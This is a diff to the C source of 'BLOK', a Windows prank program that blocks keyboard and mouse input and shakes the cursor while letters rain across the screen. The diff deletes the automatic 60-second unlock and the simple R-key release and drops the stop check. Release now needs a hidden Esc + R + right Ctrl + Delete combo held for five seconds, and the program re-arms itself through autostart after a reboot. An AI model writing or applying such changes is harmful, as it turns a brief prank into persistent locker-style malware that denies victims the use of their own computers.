@@ -1,8 +1,9 @@
 /* ------------------------------------------------------------------
    BLOK  -  "input lock" prank for Windows
    Keyboard and mouse are blocked, the cursor shakes violently and
-   random english letters rain down the screen.  Press R to release.
-   If nobody presses R, everything unlocks by itself after 60 seconds.
+   random english letters rain down the screen.  Release: hold
+   Esc + R + right Ctrl + Delete for 5 seconds; that also removes the
+   autostart entry.  A reboot does not help: the app re-arms itself.
 
    Pure Win32 + GDI, 32-bit, static, runs on Windows XP/7 and newer.
    Build: i686-w64-mingw32-gcc -O2 -s -municode -mwindows blok.c -lgdi32 -luser32
@@ -15,7 +16,7 @@
 #include <string.h>
 #include <wchar.h>
 
-#define RUN_MS   600000
+#define RAMP_MS  300000
 #define COMBO_MS   5000
 #define MAXG     96
 
@@ -64,7 +65,7 @@ static HFONT gFG = 0, gFG2 = 0, gFWord = 0, gFHint = 0, gFSmall = 0;
 static HHOOK gHkKb = 0, gHkMs = 0;
 
 static DWORD gStart = 0, gNowMs = 0, gTick = 0;
-static int   gStopReq = 0, gClosing = 0;
+static int   gClosing = 0;
 
 /* release combo: Esc + R + right Ctrl + Delete, held for COMBO_MS */
 static int   gComboOn = 0, gComboMs = 0;
@@ -187,10 +188,10 @@ static const int gCirY[24] = {
 static int gDriftX = 0, gDriftY = 0;
 static int gPhase = 0, gMode = 0, gModeLeft = 0;
 
-/* 0..1000 depending on how much of the run has already passed */
+/* 0..1000 depending on how long the lock has been going (escalation ramp) */
 static int Prog(void)
 {
-    int p = (int)((long long)gNowMs * 1000 / RUN_MS);
+    int p = (int)((long long)gNowMs * 1000 / RAMP_MS);
     return p > 1000 ? 1000 : p;
 }
 
@@ -339,10 +340,8 @@ static void DrawGlyphs(HDC dc)
 static void DrawStatus(HDC dc)
 {
     int pad = gW / 40;
-    int rem = (int)((RUN_MS - gNowMs + 999) / 1000);
+    int el = (int)(gNowMs / 1000);
     wchar_t s[96];
-
-    if (rem < 0) rem = 0;
 
     Txt(dc, gFSmall, C_MID, pad, gH / 40, L"SYS.INPUT: OFFLINE");
     if ((gNowMs / 500u) % 2u == 0u) {
@@ -357,7 +356,7 @@ static void DrawStatus(HDC dc)
         FillRect(dc, &r, gBrGreen);
     }
 
-    wsprintfW(s, L"LOCK %02d:%02d", rem / 60, rem % 60);
+    wsprintfW(s, L"LOCK %02d:%02d", el / 60, el % 60);
     Txt(dc, gFSmall, C_HINT, gW - pad - TextW(dc, gFSmall, s), gH / 40, s);
 }
 
@@ -519,11 +518,6 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM wp, LPARAM lp)
         if (dt < 1) dt = 1;
         if (dt > 120) dt = 120;
         gNowMs = now - gStart;
-
-        if (gStopReq || gNowMs >= (DWORD)RUN_MS) {
-            DoStop(0);                    /* time is up: autostart stays armed */
-            return 0;
-        }
 
         if (gComboOn) {
             gComboMs = (int)(now - gComboStart);
